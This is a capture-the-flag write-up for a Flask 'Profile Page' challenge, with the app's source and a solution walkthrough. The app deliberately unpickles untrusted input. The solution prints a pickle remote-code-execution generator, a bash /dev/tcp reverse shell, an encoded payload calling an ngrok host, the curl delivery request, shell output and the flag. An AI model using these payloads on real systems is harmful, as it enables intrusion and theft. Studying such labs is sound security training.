# Profile Page

## Description

Get the flag and submit it here ([https://dsw3qg.wizer-ctf.com/submit_flag/<flag>](https://dsw3qg.wizer-ctf.com/submit_flag/<flag>)) to win the challenge! (profile page: [https://dsw3qg.wizer-ctf.com/profile](https://dsw3qg.wizer-ctf.com/profile))

## Source Code

```python
from flask import Flask, request, render_template
import pickle
import base64

app = Flask(__name__, template_folder='templates')
real_flag = ''
with open('/flag.txt') as flag_file:
    real_flag = flag_file.read().strip()

class Profile:
    def __init__(self, username, email, bio):
        self.username = username
        self.email = email
        self.bio = bio

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        bio = request.form.get('bio')

        if username and email and bio:
            profile = Profile(username, email, bio)
            dumped = base64.b64encode(pickle.dumps(profile)).decode()
            return render_template('profile.html', profile=profile, dumped=dumped)

    load_object = request.args.get('load_object')
    if load_object:
        try:
            profile = pickle.loads(base64.b64decode(load_object))
            return render_template('profile.html', profile=profile, dumped=load_object)
        except pickle.UnpicklingError as e:
            return f"Error loading profile: {str(e)}", 400

    return render_template('input.html')

@app.route('/submit_flag/<flag>', methods=['GET'])
def flag(flag):
    return real_flag if flag == real_flag else 'Not correct!'

if __name__ == '__main__':
    app.run(debug=True)
```

## Solution

#### Understanding the code

This appears to be a `Flask` web application, starts by creating a class named `Profile` that represents user profiles. It has attributes such as `username`, `email`, and `bio`.

The main route of interest is `/profile`, which handles both `GET` and `POST` requests. If it's a `POST` request, the code retrieves user input from the parameters (`username`, `email`, `bio`). It then creates a `Profile` object, serializes it using the `pickle` module, encodes the serialized object in base64, and passes it to the `profile.html` template for rendering.

If the request is a `GET` request and includes a `load_object` parameter, the code attempts to deserialize the object from base64. If successful, it renders the `profile.html` template with the loaded profile.

#### Solving the challenge

We already spot the interesting part of this code which is the fact that we can pass serialized objects in the GET parameter `load_object` and the app just deserialize it without any checks.

For more details about how to abuse this, you check this [article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

So basically we will create a malicious serialized object that will hold an instance of a malicious class that performs command execution, then pass that serialized object to the app via the `load_object` parameter, then the app deserializes it and execute the code and we get by that command execution!

First we create the code that will give us the maclicious object :

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('ANY SHELL COMMAND YOU WANNA RUN')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

In our case, we specify a reverse shell as the command :

```bash
bash -c "/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1"
```

Then we run the python code :

```bash
python3 pickle_generator.py

b'gASVWgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTk3NzEgMD4mMSKUhZRSlC4='
```

Now we have our maclicious serialized object, next we start a listener using `nc` and `ngrok` to forward outside connections to our local port :

```bash
nc -lvnp 4444

ngrok tcp 4444
```

Next we pass that serialized object to the `load_object` parameter :

```bash
curl 'https://dsw3qg.wizer-ctf.com/profile?load_object=gASVWgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTk3NzEgMD4mMSKUhZRSlC4='
```

As soon as we make that request we recieve a connect back to our listener with the reverse shell :

```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44240
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
nonrootuser@6d79931c83ac:/$ id
uid=1000(nonrootuser) gid=1000(nonrootuser) groups=1000(nonrootuser)
```

now we have command execution, let's read the flag which is located in `/flag.txt` :

```bash
nonrootuser@6d79931c83ac:/$ cat /flag.txt
WIZER{'PICKL1NG_1S_DANGEROUS'}
```

And we solved the fourth challenge!
